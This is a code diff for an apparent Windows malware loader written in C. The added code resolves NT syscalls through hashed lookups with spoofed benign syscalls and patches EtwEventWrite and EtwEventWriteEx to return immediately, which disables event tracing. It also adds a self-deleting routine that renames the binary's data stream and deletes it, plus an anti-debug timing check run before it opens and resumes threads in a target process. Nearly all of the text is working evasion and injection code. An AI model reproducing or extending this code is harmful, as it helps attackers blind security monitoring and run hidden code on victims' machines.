@@ -320,6 +320,30 @@ BOOL InitializeNtSyscalls()
 	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtAlertResumeThread.dwSSn, g_SyscallTab.NtAlertResumeThread.pSyscallAddress);
 
+	if (!ResolveNtSyscall(NtProtectVirtualMemory_CRC32, &g_SyscallTab.NtProtectVirtualMemory))
+	{
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
+		return FALSE;
+	}
+	DEBUG_PRINT("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+		g_SyscallTab.NtProtectVirtualMemory.dwSSn, g_SyscallTab.NtProtectVirtualMemory.pSyscallAddress);
+
+	if (!ResolveNtSyscall(NtWriteVirtualMemory_CRC32, &g_SyscallTab.NtWriteVirtualMemory))
+	{
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory \n");
+		return FALSE;
+	}
+	DEBUG_PRINT("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+		g_SyscallTab.NtWriteVirtualMemory.dwSSn, g_SyscallTab.NtWriteVirtualMemory.pSyscallAddress);
+
+	if (!ResolveNtSyscall(NtAllocateVirtualMemory_CRC32, &g_SyscallTab.NtAllocateVirtualMemory))
+	{
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory \n");
+		return FALSE;
+	}
+	DEBUG_PRINT("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+		g_SyscallTab.NtAllocateVirtualMemory.dwSSn, g_SyscallTab.NtAllocateVirtualMemory.pSyscallAddress);
+
 	return TRUE;
 }
 
@@ -343,11 +367,15 @@ BOOL DisableETW(HANDLE hRemoteProc)
 {
 	NTSTATUS status = 0x0;
 	fnVirtualProtect pfnVirtualProtect = NULL;
+	fnVirtualProtectEx pfnVirtualProtectEx = NULL;
 	PVOID EtwEventWrite = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), EtwEventWrite_CRC32);
 	PVOID EtwEventWriteEx = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), EtwEventWriteEx_CRC32);
 	pfnVirtualProtect = (fnVirtualProtect)GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), VirtualProtect_CRC32);
-
+	pfnVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), VirtualProtectEx_CRC32);
+	//pNtProtectVirtualMemory fpNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddressH(GetModuleHandleH(ntdll_CRC32), NtProtectVirtualMemory_CRC32);
 	DEBUG_PRINT("[!] VirtualProtect @ 0x%p ... \n", pfnVirtualProtect);
+
+	//DEBUG_PRINT("[!] pNtProtectVirtualMemory @ ============> 0x%p \n", fpNtProtectVirtualMemory);
 
 	DEBUG_PRINT("[!] EtwEventWrite @ 0x%p \n", EtwEventWrite);
 	DEBUG_PRINT("[!] EtwEventWriteEx @ 0x%p \n", EtwEventWriteEx);
@@ -370,16 +398,83 @@ BOOL DisableETW(HANDLE hRemoteProc)
 
 	SIZE_T numberOfBytesToProtect1 = 0x10;
 	SIZE_T numberOfBytesToProtect2 = 0x10;
+	//SIZE_T numberOfBytesToProtect3 = 0x10;
+	//SIZE_T numberOfBytesToProtect4 = 0x10;
 	DWORD oldAccessProtection1 = 0x0;
 	DWORD oldAccessProtection2 = 0x0;
+	//DWORD oldAccessProtection3 = 0x0;
+	//DWORD oldAccessProtection4 = 0x0;
+	ULONG newAccessProtection = PAGE_EXECUTE_READWRITE;
 
 	pfnVirtualProtect(EtwEventWrite, numberOfBytesToProtect1, PAGE_EXECUTE_READWRITE, &oldAccessProtection1);
 	pfnVirtualProtect(EtwEventWriteEx, numberOfBytesToProtect2, PAGE_EXECUTE_READWRITE, &oldAccessProtection2);
+	//pfnVirtualProtectEx(hRemoteProc, EtwEventWrite, numberOfBytesToProtect3, PAGE_EXECUTE_READWRITE, &oldAccessProtection3);
+	//pfnVirtualProtectEx(hRemoteProc, EtwEventWriteEx, numberOfBytesToProtect4, PAGE_EXECUTE_READWRITE, &oldAccessProtection4);
+	//VirtualProtect_p(pAddr, 4096, PAGE_EXECUTE_READWRITE, &oldAccessProtection1);
+	DEBUG_PRINT("[!] Testing VirtualProtect ... \n");
+
+	//SET_SYSCALL(g_SyscallTab.NtProtectVirtualMemory, g_Benign_Syscall_tab.NtOpenFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &pAddr, &numberOfBytesToProtect1, PAGE_EXECUTE_READWRITE, &oldAccessProtection1))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtProtectVirtualMemory for EtwEventWrite Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//SET_SYSCALL(g_SyscallTab.NtProtectVirtualMemory, g_Benign_Syscall_tab.NtOpenFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &EtwEventWrite, &numberOfBytesToProtect1, PAGE_EXECUTE_READWRITE, &oldAccessProtection1))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtProtectVirtualMemory for EtwEventWrite Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//if (!NT_SUCCESS(fpNtProtectVirtualMemory((HANDLE)-1, &EtwEventWrite, &numberOfBytesToProtect1, PAGE_EXECUTE_READWRITE, &oldAccessProtection1)))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] fpNtProtectVirtualMemory for EtwEventWrite Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//SET_SYSCALL(g_SyscallTab.NtProtectVirtualMemory, g_Benign_Syscall_tab.NtCreateFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &EtwEventWriteEx, &numberOfBytesToProtect2, PAGE_EXECUTE_READWRITE, &oldAccessProtection2))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtProtectVirtualMemory for EtwEventWriteEx Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
 
 	DEBUG_PRINT("[!] Press Enter to write patch ... \n");
 	_INT;
 
+	//unsigned char t[] = { 0x48, 0x33, 0xc0, 0xc3 };
+	//SIZE_T sBytesWritten = sizeof(t);
+	//SIZE_T sBuf = sizeof(t);
+
 #ifdef _WIN64
+	//SET_SYSCALL(g_SyscallTab.NtWriteVirtualMemory, g_BenignSyscalltab.NtCreateFile);
+	//if (!NT_SUCCESS(status = ExecSyscall(hRemoteProc, EtwEventWrite, t, sBuf, &sBytesWritten)) || sBytesWritten != sBuf)
+	////if (!NT_SUCCESS(status = ExecSyscall((HANDLE)-1, pAddr, t, sBuf, &sBytesWritten)) || sBytesWritten != sBuf)
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[-]Failed to write ETW patch with error code: 0x%X\n", GetLastError());
+	//	return FALSE;
+	//}
+	//else
+	//{
+	//	DEBUG_PRINT("[!] Write patch success ... \n");
+	//}
+	//if (!NT_SUCCESS(status = ExecSyscall(hRemoteProc, EtwEventWriteEx, t, sBuf, &sBytesWritten)) || sBytesWritten != sBuf)
+	//	//if (!NT_SUCCESS(status = ExecSyscall((HANDLE)-1, pAddr, t, sBuf, &sBytesWritten)) || sBytesWritten != sBuf)
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[-]Failed to write ETWex patch with error code: 0x%X\n", GetLastError());
+	//	return FALSE;
+	//}
+	//else
+	//{
+	//	DEBUG_PRINT("[!] Write patch success ... \n");
+	//}
 	_memcpy(EtwEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
 	_memcpy(EtwEventWriteEx, "\x48\x33\xc0\xc3", 4); 	// xor rax, rax; ret
 #else
@@ -390,11 +485,47 @@ BOOL DisableETW(HANDLE hRemoteProc)
 	DEBUG_PRINT("[!] Press Enter to restore Etw Memory Protect ... \n");
 	_INT;
 
+
+	//SET_SYSCALL(g_SyscallTab.NtProtectVirtualMemory, g_Benign_Syscall_tab.NtLockFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &pAddr, &numberOfBytesToProtect1, oldAccessProtection1, &oldAccessProtection1))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtProtectVirtualMemory for EtwEventWrite to Original Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//SET_SYSCALL(g_SyscallTab.NtProtectVirtualMemory, g_Benign_Syscall_tab.NtLockFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &EtwEventWrite, &numberOfBytesToProtect1, oldAccessProtection1, &oldAccessProtection1))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtProtectVirtualMemory for EtwEventWrite to Original Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//if (!NT_SUCCESS(fpNtProtectVirtualMemory((HANDLE)-1, &EtwEventWrite, &numberOfBytesToProtect1, oldAccessProtection1, &oldAccessProtection1)))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] fpNtProtectVirtualMemory for EtwEventWrite to Original Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//SET_SYSCALL(g_SyscallTab.NtProtectVirtualMemory, g_Benign_Syscall_tab.NtWriteFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &EtwEventWriteEx, &numberOfBytesToProtect2, oldAccessProtection2, &oldAccessProtection2))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtProtectVirtualMemory for EtwEventWriteEx to Original Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
 	pfnVirtualProtect(EtwEventWrite, 4096, oldAccessProtection1, &oldAccessProtection1);
 	pfnVirtualProtect(EtwEventWriteEx, 4096, oldAccessProtection2, &oldAccessProtection2);
+	//pfnVirtualProtectEx(hRemoteProc, EtwEventWrite, numberOfBytesToProtect3, oldAccessProtection3, &oldAccessProtection3);
+	//pfnVirtualProtectEx(hRemoteProc, EtwEventWriteEx, numberOfBytesToProtect4, oldAccessProtection4, &oldAccessProtection4);
 
 	FlushInstructionCache((HANDLE)-1, EtwEventWrite, 4096);
 	FlushInstructionCache((HANDLE)-1, EtwEventWriteEx, 4096);
+	//FlushInstructionCache(hRemoteProc, EtwEventWrite, 4096);
+	//FlushInstructionCache(hRemoteProc, EtwEventWriteEx, 4096);
 
 	return TRUE;
 }
@@ -408,6 +539,7 @@ BOOL DeleteSelf()
 	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
 	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
 
+	// allocating enough buffer for the 'FILE_RENAME_INFO' structure
 	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
 	if (!pRename)
 	{
@@ -415,20 +547,31 @@ BOOL DeleteSelf()
 		return FALSE;
 	}
 
+	// cleaning up the structures
 	ZeroMemory(szPath, sizeof(szPath));
 	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
 
+	//--------------------------------------------------------------------------------------------------------------------------
+	// marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
 	Delete.DeleteFile = TRUE;
 
+	// setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
 	pRename->FileNameLength = sizeof(NewStream);
 	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
 
-	if (g_ApiTab.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0)
+	//--------------------------------------------------------------------------------------------------------------------------
+
+	// used to get the current file name
+	if (0 == g_ApiTab.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2))
 	{
 		DEBUG_PRINT("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
+	//--------------------------------------------------------------------------------------------------------------------------
+	// RENAMING
+
+	// openning a handle to the current file
 	hFile = g_ApiTab.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (INVALID_HANDLE_VALUE == hFile)
 	{
@@ -438,6 +581,7 @@ BOOL DeleteSelf()
 
 	DEBUG_PRINT(L"[i] Renaming :$DATA to %ls  ...", NEW_STREAM);
 
+	// renaming the data stream
 	if (!g_ApiTab.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
 	{
 		DEBUG_PRINT("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
@@ -448,8 +592,13 @@ BOOL DeleteSelf()
 
 	CloseHandle(hFile);
 
+	//--------------------------------------------------------------------------------------------------------------------------
+	// DELEING
+
+	// openning a new handle to the current file
 	hFile = g_ApiTab.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (INVALID_HANDLE_VALUE == hFile && ERROR_FILE_NOT_FOUND == GetLastError())
+		// in case the file is already deleted
 		return TRUE;
 
 	if (INVALID_HANDLE_VALUE == hFile)
@@ -460,6 +609,7 @@ BOOL DeleteSelf()
 
 	DEBUG_PRINT("[i] DELETING ...");
 
+	// marking for deletion after the file's handle is closed
 	if (!g_ApiTab.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete)))
 	{
 		DEBUG_PRINT("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
@@ -470,6 +620,9 @@ BOOL DeleteSelf()
 
 	g_ApiTab.pCloseHandle(hFile);
 
+	//--------------------------------------------------------------------------------------------------------------------------
+
+	// freeing the allocated buffer
 	HeapFree(GetProcessHeap(), 0, pRename);
 
 	return TRUE;
@@ -479,12 +632,19 @@ int main(int argc, char* argv[])
 {
 	if (TimeTickCheck())
 		return -1;
-	
-	if (argc < 2)
+
+	if (!InitializeApi())
 	{
-		printf("[-]Usage: %s <process id> ...\n", argv[0]);
+		DEBUG_PRINT("[!] Failed To Initialize API \n");
 		return -1;
 	}
+
+	if (!DeleteSelf())
+		return -1;
+
+	if (argc < 2)
+		//printf("[-]Usage: %s <process id> ...\n", argv[0]);
+		return -1;
 
 	PDWORD64 dwPid = (PDWORD64)atoi(argv[1]);
 	NTSTATUS status = 0x0;
@@ -508,20 +668,12 @@ int main(int argc, char* argv[])
 		.HighPart = 0
 	};
 
+	// initializing the used syscalls
 	if (!InitializeNtSyscalls())
 	{
 		DEBUG_PRINT("[!] Failed To Initialize The Specified Direct-Syscalls \n");
 		return -1;
 	}
-
-	if (!InitializeApi())
-	{
-		DEBUG_PRINT("[!] Failed To Initialize API \n");
-		return -1;
-	}
-
-	if (!DeleteSelf())
-		return -1;
 
 	// open target process
 	SET_SYSCALL(g_SyscallTab.NtOpenProcess, g_BenignSyscalltab.NtCreateFile);
@@ -645,7 +797,7 @@ int main(int argc, char* argv[])
 		DEBUG_PRINT("[!] NtAlertResumeThread Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
-	
+
 	// slepp for 3 seconds then unmap to clear memory artifacts
 	Sleep(2000);
 
